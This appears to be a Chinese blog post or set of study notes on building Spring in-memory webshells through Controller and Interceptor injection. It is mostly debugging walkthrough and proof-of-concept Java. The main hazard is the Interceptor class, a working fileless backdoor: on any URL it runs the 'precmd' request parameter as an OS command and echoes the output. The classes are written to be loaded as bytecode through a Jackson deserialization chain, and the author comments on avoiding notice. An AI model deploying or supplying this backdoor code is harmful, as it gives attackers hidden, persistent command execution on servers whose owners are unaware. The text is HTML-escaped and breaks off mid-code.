\u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.15.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.12.1.GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-boot.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; \u0026lt;build\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.apache.maven.plugins\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;maven-compiler-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.8.1\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;source\u0026gt;1.8\u0026lt;/source\u0026gt; \u0026lt;target\u0026gt;1.8\u0026lt;/target\u0026gt; \u0026lt;encoding\u0026gt;UTF-8\u0026lt;/encoding\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;plugin\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-maven-plugin\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-boot.version}\u0026lt;/version\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;mainClass\u0026gt;org.example.springboot1.Springboot1Application\u0026lt;/mainClass\u0026gt; \u0026lt;skip\u0026gt;true\u0026lt;/skip\u0026gt; \u0026lt;/configuration\u0026gt; \u0026lt;executions\u0026gt; \u0026lt;execution\u0026gt; \u0026lt;id\u0026gt;repackage\u0026lt;/id\u0026gt; \u0026lt;goals\u0026gt; \u0026lt;goal\u0026gt;repackage\u0026lt;/goal\u0026gt; \u0026lt;/goals\u0026gt; \u0026lt;/execution\u0026gt; \u0026lt;/executions\u0026gt; \u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;/build\u0026gt; \u0026lt;/project\u0026gt; Controller内存马 0x02 分析 demo1\npackage org.example.springboot1.controllers; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class IndexController { @GetMapping(\u0026#34;/test\u0026#34;) public String index() { System.out.println(\u0026#34;index\u0026#34;); return \u0026#34;Welcome to the Spring Boot application!\u0026#34;; } } 先建一个demo，然后调试分析，然后分析调用栈\n看到DispatcherServlet.java#doDispatch，至于为什么是这个地方自己慢慢调\n下一步ha.handle()中handler可以知道mappedHandler.getHandler()是存储HandlerMethod的及上面的demo对应的index()\nha.handle()后面的调用基本上就是反射来调用这个方法（demo中index）\n往上翻code看我们的ha和mappedHandler怎么来的，\nmappedHandler = getHandler(processedRequest); 这里其实就是根据request请求的路径去找对应的Handler和HandlerMethod了\n跟进getHandler()方法\n我们**/test的Handler**在RequestMappingHandlerMapping这个map就找到了，继续跟进getHandler()，看是怎么找到的\n这里继续跟进getHandlerInternal()这里主要关注这个\n后面代码还会handler进行封装，添加拦截器Interceptor进去，下面这段代码，这里我们先放着，到Interceptor内存马再研究（我猜测应该是这样）\nchain.addInterceptor(0, new CorsInterceptor(config)); return chain; 回归正题，继续跟进super.getHandlerInternal\n可以看到lookupPath得到请求的url路径，然后lookupHandlerMethod根据url路径获取对应的HandlerMethod\n跟进lookupHandlerMethod\n会根据请求的url路径找到对应的Match，然后return HandlerMethod（看下图）\nreturn bestMatch.getHandlerMethod(); 所以这里我们大概的思路就是插入一个Handler以及HandlerMethod，然后请求对应url就能触发HandlerMethod中的code实现内存马\n0x03 构造 这里我们再写一个API，看哪些参数有变化，免得一个个去调试了\n根据前面的分析，url请求到调用方法，起点还是mappedHandler = getHandler(processedRequest);里面获取了后面要用到的参数\n看到AbstractHandlerMethodMapping.java的this.mappingRegistry这个值多了/springez这对键值，那我们肯定要在这插入我们的map呀\n在后面lookupHandlerMethod()方法中也是通过this.mappingRegistry来得到HandlerMethod\n然后我们查找哪些地方对mappingRegistry这个值进行了赋值，这里看到registerMapping和registerHandlerMethod都会进行赋值。\n节点1 删除handler内存马 unregisterMapping则是删除，这里可以用来删除handler这种内存马呀\npublic void registerMapping(T mapping, Object handler, Method method) { if (logger.isTraceEnabled()) { logger.trace(\u0026#34;Register \\\u0026#34;\u0026#34; + mapping + \u0026#34;\\\u0026#34; to \u0026#34; + method.toGenericString()); } this.mappingRegistry.register(mapping, handler, method); } public void unregisterMapping(T mapping) { if (logger.isTraceEnabled()) { logger.trace(\u0026#34;Unregister mapping \\\u0026#34;\u0026#34; + mapping + \u0026#34;\\\u0026#34;\u0026#34;); } this.mappingRegistry.unregister(mapping); } protected void registerHandlerMethod(Object handler, Method method, T mapping) { this.mappingRegistry.register(mapping, handler, method); } 后面基本上也是围绕这个mappingRegistry参数，我们打个断点看下spring是怎么添加，\nspring是启动的时候通过registerHandlerMethod添加的\n问题1 传参 这里大概就两个问题吧，一个是method和mapping的传参问题，还有一个就是怎么获取到对应的AbstractHandlerMethodMapping类\n通过翻找调用栈发现mapping是通过getMappingForMethod()调用的结果，这里调用参数\nmethod是对应controller的方法（index()），userType是对应controller的Class（org.example.springboot1.controllers.IndexController）\n解决:\n还是去翻找**调用栈**，找到Method和mapping是怎么构建获得的，看到AbstractHandlerMethodMapping.java#detectHandlerMethods\n这里MethodIntrospector.selectMethods()会找到userType相关类的所有方法，然后把这些方法都传入到getMappingForMethod()中返回mapping\n跟进MethodIntrospector.selectMethods()，在doWithMethods()可以得到怎么获取Method的\n返回到上面getMappingForMethod()获取mapping\n这里就很清楚了\ngetDeclaredMethods()得到Methods\ngetMappingForMethod()得到mapping\n注意这里是getDeclaredMethods()是org.springframework.util.ReflectionUtils的方法，他自己写了一个。不是Class那个\npoc1 poc雏形，这里就直接通过反射获取方法调用吧\npackage org.example.springboot1.controllers; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import java.lang.reflect.Method; @RestController public class TestController { @GetMapping(\u0026#34;ttee\u0026#34;) public String ttee() { System.out.println(\u0026#34;ttee\u0026#34;); return \u0026#34;tteeeeeee\u0026#34;; } public static void main(String[] args) throws Exception { //String userType = \u0026#34;TestController\u0026#34;; Class\u0026lt;?\u0026gt; aClass1 = Class.forName(\u0026#34;org.springframework.util.ReflectionUtils\u0026#34;); Method getDeclaredMethods = aClass1.getDeclaredMethod(\u0026#34;getDeclaredMethods\u0026#34;, Class.class, boolean.class); getDeclaredMethods.setAccessible(true); Method[] methods = (Method[]) getDeclaredMethods.invoke(aClass1, TestController.class, true); System.out.println(methods[1].getName()); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\u0026#34;); Method getMappingForMethod = aClass.getDeclaredMethod(\u0026#34;getMappingForMethod\u0026#34;,Method.class,Class.class); getMappingForMethod.setAccessible(true); RequestMappingInfo invoke = (RequestMappingInfo) getMappingForMethod.invoke(new RequestMappingHandlerMapping(), methods[1], TestController.class); System.out.println(invoke); } } 问题2 获取运行时类实例 这里我们register肯定得插入到AbstractHandlerMethodMapping.java或者this.mappingRegistry运行时对应的**实例对象才行**呀\n解决：\n跟踪上面提到两个值\n成果只知道spring启动时这里RequestMappingHandlerMapping里面放了AbstractHandlerMethodMapping得到RequestMappingHandlerMapping就得到了AbstractHandlerMethodMapping\n存档1 上下文 no 这里最后还是没找到怎么获取上下文，感觉光看调用栈找不出来，这里暂时先存个档吧，等后面懂得多了再来补。\n上下文这个地方就没补充了，可以看参考里的文章，大致有4钟\npoc构造 前面我们分析过spring是怎么register传入参数的，但是我这里仿照spring传入会有一些问题\n这个是我最初的poc，有很多问题！_!\n@RestController public class Exec extends AbstractTranslet { @RequestMapping(\u0026#34;/exec\u0026#34;) public String Exec() throws Exception { //String userType = \u0026#34;TestController\u0026#34;; System.out.println(\u0026#34;main\u0026#34;); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); RequestMappingHandlerMapping bean = null; if (context != null) { bean = context.getBean(RequestMappingHandlerMapping.class); } Method getDeclaredMethods = TestController.class.getDeclaredMethod(\u0026#34;ttee\u0026#34;); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\u0026#34;); Method getMappingForMethod = aClass.getDeclaredMethod(\u0026#34;getMappingForMethod\u0026#34;, Method.class, Class.class); getMappingForMethod.setAccessible(true); RequestMappingInfo invoke = (RequestMappingInfo) getMappingForMethod.invoke(bean, getDeclaredMethods, TestController.class); Class\u0026lt;?\u0026gt; aClass1 = Class.forName(\u0026#34;org.springframework.util.ReflectionUtils\u0026#34;); Method getDeclaredFields = aClass1.getDeclaredMethod(\u0026#34;findField\u0026#34;, Class.class, String.class); getDeclaredFields.setAccessible(true); Field Fields = (Field) getDeclaredFields.invoke(aClass1, bean.getClass(), \u0026#34;mappingRegistry\u0026#34;); // Method getDeclaredField = aClass1.getDeclaredMethod(\u0026#34;getField\u0026#34;, Field.class, Object.class); // getDeclaredField.setAccessible(true); // Object mappingRegistry = getDeclaredField.invoke(aClass1, Fields, bean); Fields.setAccessible(true); Object abstractHandlerMethodMapping = Fields.get(bean); Class\u0026lt;?\u0026gt; aClass2 = Class.forName(\u0026#34;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\u0026#34;); Method register = aClass2.getDeclaredMethod(\u0026#34;register\u0026#34;, Object.class, Object.class, Method.class); register.setAccessible(true); register.invoke(abstractHandlerMethodMapping, invoke, \u0026#34;testController\u0026#34;, getDeclaredMethods); //abstractHandlerMethodMapping.registerMapping(invoke,\u0026#34;TestController\u0026#34;,methods[2]); System.out.println(invoke); System.out.println(\u0026#34;1111111111111111111111\u0026#34;); return \u0026#34;Inject done\u0026#34;; // } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @RestController public class TestController { @GetMapping(\u0026#34;ttee\u0026#34;) public String ttee() { System.out.println(\u0026#34;ttee\u0026#34;); return \u0026#34;tteeeeeee\u0026#34;; } } } 坑点1 这里handler spring传入的是一个contorller类的名字，但是我们不能，register()中代码处理时，会在beanType中查找对应的类，但是这里的都是spring启动的时候加载的类，不会有我们的contorller\n如果我们这里写indexController的，后面方法和url路径也不是在indexController.class的，后面访问也会有问题\n解决：\n我们看到当handler不为string时会进入HandlerMethod()\n这里我们换成new TestController()\n坑点2 这里第一步没问题了，但是validateMethodMapping()中校验我们传入的mapping，我们的mapping是在this.registry里的，spring的这里是null\n这里会抛出异常，说我们的ttee()已经mapped过了\nAmbiguous mapping. Cannot map \u0026#39;com.example.demo.demos.web.Exec$TestController@42d2ba5f\u0026#39; method com.example.demo.demos.web.Exec$TestController#ttee() to {GET [/ttee]}: There is already \u0026#39;com.example.demo.demos.web.Exec$TestController\u0026#39; bean method com.example.demo.demos.web.Exec$TestController#ttee() mapped. why？\n跟踪this.register，发现只有调用register()才能this.register.put()放入值\n我们这里再调试下是不是我们的TestController在我们register()，前就被spring register()了\n调试发现 processCandidateBean()这个地方会对类进行校验，有Controller.class和RequestMapping.class注解的类会进入detectHandlerMethods()方法=\u0026gt;后续会调用register()\n而@RestController 注解本身是基于 @Controller 注解扩展而来的，并且在内部它实际上是同时包含了 @Controller 和 @ResponseBody 的功能特性。所以这里会进入if\n解决：\n这里把TestController的@RestController删掉 这里会显示写入成功，但是访问的时候会404\n这里我看到unregister(),就想到register()前把这个mapping注销了不就行了 当然，这是因为是本地会加载，spring会加载自己加载我们本地的TestController，如果我们本地没有TestController.class反序列化字节码会加载这个TestController还会有这个问题么\n这里测试，从另一个环境调用是没这个报错的\n为什么别人没这个问题呢，这里估计是构造的方式不同 这个地方网上的poc都是null直接就跳过了这里，我的是和spring一模一样调用方式和参数，这里get是比较key的hash，所以我的poc这里会得到值wwww，可以用下面这种构造\nPatternsRequestCondition url = new PatternsRequestCondition(\u0026#34;/evil\u0026#34;); RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition(); RequestMappingInfo info = new RequestMappingInfo(url, condition, null, null, null, null, null); demo poc package com.example.demo.demos.web; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import java.lang.reflect.Field; import java.lang.reflect.Method; @RestController public class Exec extends AbstractTranslet { @RequestMapping(\u0026#34;/exec\u0026#34;) public String Exec() throws Exception { System.out.println(\u0026#34;main\u0026#34;); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); //获取上下文 RequestMappingHandlerMapping bean = null; if (context != null) { bean = context.getBean(RequestMappingHandlerMapping.class); //获取RequestMappingHandlerMapping对象 } Method getDeclaredMethods = TestController.class.getDeclaredMethod(\u0026#34;ttee\u0026#34;); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\u0026#34;); Method getMappingForMethod = aClass.getDeclaredMethod(\u0026#34;getMappingForMethod\u0026#34;, Method.class, Class.class); getMappingForMethod.setAccessible(true); RequestMappingInfo invoke = (RequestMappingInfo) getMappingForMethod.invoke(bean, getDeclaredMethods, TestController.class); Class\u0026lt;?\u0026gt; aClass1 = Class.forName(\u0026#34;org.springframework.util.ReflectionUtils\u0026#34;); Method getDeclaredFields = aClass1.getDeclaredMethod(\u0026#34;findField\u0026#34;, Class.class, String.class); getDeclaredFields.setAccessible(true); Field Fields = (Field) getDeclaredFields.invoke(aClass1, bean.getClass(), \u0026#34;mappingRegistry\u0026#34;); Fields.setAccessible(true); //这里是获取RequestMappingHandlerMapping的mappingRegistry，对应的是AbstractHandlerMethodMapping$MappingRegistry Object abstractHandlerMethodMapping = Fields.get(bean); Class\u0026lt;?\u0026gt; aClass2 = Class.forName(\u0026#34;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\u0026#34;); Method register = aClass2.getDeclaredMethod(\u0026#34;register\u0026#34;, Object.class, Object.class, Method.class); register.setAccessible(true); Method unregister = aClass2.getDeclaredMethod(\u0026#34;unregister\u0026#34;, Object.class); unregister.setAccessible(true); unregister.invoke(abstractHandlerMethodMapping,invoke); //这里是因为是本地调用要unregister() register.invoke(abstractHandlerMethodMapping, invoke, new TestController(), getDeclaredMethods); System.out.println(invoke); System.out.println(\u0026#34;1111111111111111111111\u0026#34;); return \u0026#34;Inject done\u0026#34;; } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @RestController public class TestController { @GetMapping(\u0026#34;/ttee\u0026#34;) public String ttee() { System.out.println(\u0026#34;ttee\u0026#34;); return \u0026#34;tteeeeeee\u0026#34;; } } } 但是上面这个poc不好，他还有一个调用子类（TestController）的操作，用加载字节码调用的话会报错：找不到类这个错误\n还有上面这个unregister是因为是本地环境所以用这个，解决坑点2，不是本地话，如果本身没这个mapping，直接调用unregister会返回return;\n最终poc(字节码形式 我们把要访问的方法写到一个Class里，本身这个Class（Exec）是能找到的，TestController会找不到\n再写一个构造方法，避免实例化的时候一直循环调用无参构造方法\n这里获取RequestMappingInfo我还是用的spring的方法，本地打的话要注意下（坑点2），我这里是用来打jackson原生链+spring内存马的，是加载的下面类的字节码，是可以打成功的\npackage payload; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import java.lang.reflect.Field; import java.lang.reflect.Method; @RestController public class Exec extends AbstractTranslet { @GetMapping(\u0026#34;/ttee\u0026#34;) public String ttee() { System.out.println(\u0026#34;ttee\u0026#34;); return \u0026#34;tteeeeeee\u0026#34;; } public Exec() throws Exception { System.out.println(\u0026#34;main\u0026#34;); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); RequestMappingHandlerMapping bean = null; if (context != null) { bean = context.getBean(RequestMappingHandlerMapping.class); } Method getDeclaredMethods = Exec.class.getDeclaredMethod(\u0026#34;ttee\u0026#34;); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping\u0026#34;); Method getMappingForMethod = aClass.getDeclaredMethod(\u0026#34;getMappingForMethod\u0026#34;, Method.class, Class.class); getMappingForMethod.setAccessible(true); RequestMappingInfo invoke = (RequestMappingInfo) getMappingForMethod.invoke(bean, getDeclaredMethods, Exec.class); Class\u0026lt;?\u0026gt; aClass1 = Class.forName(\u0026#34;org.springframework.util.ReflectionUtils\u0026#34;); Method getDeclaredFields = aClass1.getDeclaredMethod(\u0026#34;findField\u0026#34;, Class.class, String.class); getDeclaredFields.setAccessible(true); Field Fields = (Field) getDeclaredFields.invoke(aClass1, bean.getClass(), \u0026#34;mappingRegistry\u0026#34;); Fields.setAccessible(true); Object abstractHandlerMethodMapping = Fields.get(bean); Class\u0026lt;?\u0026gt; aClass2 = Class.forName(\u0026#34;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\u0026#34;); Method register = aClass2.getDeclaredMethod(\u0026#34;register\u0026#34;, Object.class, Object.class, Method.class); register.setAccessible(true); System.out.println(\u0026#34;register------------------\u0026#34;); register.invoke(abstractHandlerMethodMapping, invoke, new Exec(\u0026#34;a\u0026#34;), getDeclaredMethods); System.out.println(invoke); System.out.println(\u0026#34;1111111111111111111111\u0026#34;); } public Exec(String a) { } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 0x04 总结 起初是想自己发现和构造的，但是花了很多时间，后面也是没耐心了去看了网上文章，主要找上下文那个地方感觉思路不对（目前还没啥想法），而且收效甚微。\n问题：\n感觉构造的时候只会去一味仿照spring去构造，对类和代码的理解不够，构造的poc也很死板，不灵活 理解报错的能力和查阅的能力有待提高 Interceptor内存马 0x01 分析 这里写了个demo\npackage com.example.demo.demos.web; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; @Configuration public class InterceptorConfig implements WebMvcConfigurer { // 定义内部类作为拦截器 private class MyInterceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { // 在请求处理之前执行的逻辑 System.out.println(\u0026#34;MyInterceptor: 在请求处理之前执行，请求路径：\u0026#34; + request.getRequestURI()); // 这里可以进行权限验证等操作，如果验证不通过可以返回 false 中断请求处理 return true; } //@Override // public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler) // throws Exception { // // 在请求处理之后执行的逻辑（不再依赖ModelViewContainer） // System.out.println(\u0026#34;MyInterceptor: 在请求处理之后执行，请求路径：\u0026#34; + request.getRequestURI()); // } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) { // 在整个请求完成之后执行的逻辑 System.out.println(\u0026#34;MyInterceptor: 在整个请求完成之后执行，请求路径：\u0026#34; + request.getRequestURI()); } } @Override public void addInterceptors(InterceptorRegistry registry) { // 注册内部类定义的拦截器，并指定拦截路径 registry.addInterceptor(new MyInterceptor()).addPathPatterns(\u0026#34;/**\u0026#34;); } } controller的代码\n@RequestMapping(\u0026#34;/hello\u0026#34;) @ResponseBody public String hello(@RequestParam(name = \u0026#34;name\u0026#34;, defaultValue = \u0026#34;unknown user\u0026#34;) String name) { System.out.println(\u0026#34;请求中+hello\u0026#34;); return \u0026#34;Hello \u0026#34; + name; } 然后我们访问/hello返回\nMyInterceptor: 在请求处理之前执行，请求路径：/hello 请求中+hello MyInterceptor: 在整个请求完成之后执行，请求路径：/hello 请求/hello会调用preHandle()和afterCompletion()中的代码，我们内存马就可以存储在这两个方法里，然后就是插入的问题了\n从demo也不难发现插入的地方，还有之前controller内存马分析的时候有个地方应该是插入点\n正片开始 这里还是按照常规逻辑分析下吧，在preHandle打下断点，往前看调用栈\n看到applyPreHandle()这里会循环调用HandlerInterceptor的preHandle方法\n然后再往前，mappedHandler是getHandler()得到的\n然后其实就是之前分析controller那个地方，证实之前的猜想，getHandler()获取mappedHandler时会去获取Interceptor\n这里会循环添加this.adaptedInterceptors中的HandlerInterceptor，所以我们要污染这个值，进行插入我们的Interceptor内存马\n0x02 构造 这里插入点找到了就是怎么构造了，这里我们查找this.adaptedInterceptors都没有相关的方法直接插入，但是有间接的\nAbstractHandlerMapping.java\ninitInterceptors()这里会this.adaptedInterceptors.add(adaptInterceptor(interceptor));添加，但是是添加的this.interceptors中的值，所以我们又去找this.interceptors的插入方法\nprotected void initInterceptors() { if (!this.interceptors.isEmpty()) { for (int i = 0; i \u0026lt; this.interceptors.size(); i++) { Object interceptor = this.interceptors.get(i); if (interceptor == null) { throw new IllegalArgumentException(\u0026#34;Entry number \u0026#34; + i + \u0026#34; in interceptors array is null\u0026#34;); } this.adaptedInterceptors.add(adaptInterceptor(interceptor)); } } } setInterceptors()方法可以插入this.interceptors\n这里addAll是加入我们的interceptors，不会覆盖this.interceptors之前的值，我之前还以为会覆盖掉hh\npublic void setInterceptors(Object... interceptors) { this.interceptors.addAll(Arrays.asList(interceptors)); } 其实找到上面上个方法就可以利用，这里还看到initApplicationContext()方法\n这里先重置this.adaptedInterceptors，然后再重新赋值\n不然的话，直接调用上面方法会使别人spring自己的interceptors多一倍\n@Override protected void initApplicationContext() throws BeansException { extendInterceptors(this.interceptors); detectMappedInterceptors(this.adaptedInterceptors); initInterceptors(); } 然后这里大概顺序就是setInterceptors然后initApplicationContext完成插入，然后我们来构造poc\n但是除了这些，构造poc还有些问题需要思考。\n问题1 AbstractHandlerMapping 上面那几个方法都来自AbstractHandlerMapping，我们怎么得到这个类呢，我们获取上下文后得到的是RequestMappingHandlerMapping对象，然后我看这个类的属性和相关方法都不能调用到AbstractHandlerMapping\nAbstractHandlerMapping是抽象类，所以上下文获取后，不能创造这个的实例\n解决：\n但是还有个点RequestMappingHandlerMapping是AbstractHandlerMapping的子类\n调用子类没找方法时就会调用父类方法，所以这里直接用RequestMappingHandlerMapping对象！\n问题2 类型 setInterceptors()这里赋值要继承Interceptor\nbean.setInterceptors(new Interceptor[]{new Interceptor_demo(\u0026#34;a\u0026#34;)}); 在initInterceptors()要插入时会进行一个类别识别及转换\n所以还要继承HandlerInterceptor\n0x03 poc package com.example.demo.demos.web; import org.aopalliance.intercept.Interceptor; import org.springframework.lang.Nullable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.PrintWriter; import java.lang.reflect.Method; @RestController public class Interceptor_demo implements HandlerInterceptor,Interceptor { @RequestMapping(\u0026#34;/inter\u0026#34;) public String Interceptor_demo() throws Exception { System.out.println(\u0026#34;main\u0026#34;); WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); RequestMappingHandlerMapping bean = null; if (context != null) { bean = context.getBean(RequestMappingHandlerMapping.class); } bean.setInterceptors(new Interceptor[]{new Interceptor_demo()}); Class\u0026lt;?\u0026gt; aClass2 = Class.forName(\u0026#34;org.springframework.web.servlet.handler.AbstractHandlerMapping\u0026#34;); Method initApplicationContext = aClass2.getDeclaredMethod(\u0026#34;initApplicationContext\u0026#34;); initApplicationContext.setAccessible(true); initApplicationContext.invoke(bean); System.out.println(\u0026#34;1111111111111111111111\u0026#34;); return \u0026#34;Inject done\u0026#34;; } @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String precmd = request.getParameter(\u0026#34;precmd\u0026#34;); if (precmd!= null \u0026amp;\u0026amp;!precmd.isEmpty()) { try { Process process = Runtime.getRuntime().exec(precmd); InputStreamReader isr = new InputStreamReader(process.getInputStream()); BufferedReader br = new BufferedReader(isr); response.setContentType(\u0026#34;text/plain\u0026#34;); PrintWriter writer = response.getWriter(); String line; while ((line = br.readLine())!= null) { writer.write(line + \u0026#34;\\n\u0026#34;); } br.close(); isr.close(); } catch (IOException e) { response.setContentType(\u0026#34;text/plain\u0026#34;); PrintWriter writer = response.getWriter(); writer.write(\u0026#34;执行命令时出现异常: \u0026#34; + e.getMessage()); writer.close(); } } System.out.println(\u0026#34;preprepreprepreprepre\u0026#34;); // 这里可以进行权限验证等操作，如果验证不通过可以返回 false 中断请求处理 return true; } // public Interceptor_demo(String a) { // } public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, @Nullable ModelAndView mv) throws Exception { System.out.println(\u0026#34;postpostpostpostpost\u0026#34;); } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws IOException { System.out.println(\u0026#34;afterafterafterafter\u0026#34;); } } poc这里方便复现，直接用的路由这种方式，然后用字节码加载的话要改成自构方法并且添加一个有参自构方法，并且bean.setInterceptors(new Interceptor[]{new Interceptor_demo()});这里换成有参自构方法。避免一直循环调用自构方法方法了（这里递归了）\n然后这里Interceptor中preHandle()构造回显没问题，其他两个会有问题，可能是因为后面两个方法调用在controller（这里指/hello）后面，在controller的时候已经返回值的原因.\n但是会preHandle()在controller调用前调用并返回结果，会影响controller正常功能(见下图)，这样容易被察觉\n但是我们可以选一个其他url路径执行，why？为什么可以这样呢，我们poc中又没有配置url路径？看到下面问题3\npayload: http://127.0.0.1:8080/z?precmd=whoami 问题3 url路径 我们知道每次访问是从下图添加Interceptor的，但是这里我们的Interceptor_demo不继承MappedInterceptor，以至于会不会进行\nif (mappedInterceptor.matches(request)) {的校验，所以任何url路径都会添加我们的Interceptor_demo hhh\nend poc2 还是记录下来吧，方便后面用（字节码的形式）\nimport com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.aopalliance.intercept.Interceptor; import org.springframework.lang.Nullable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.io.PrintWriter; import java.lang.reflect.Method; 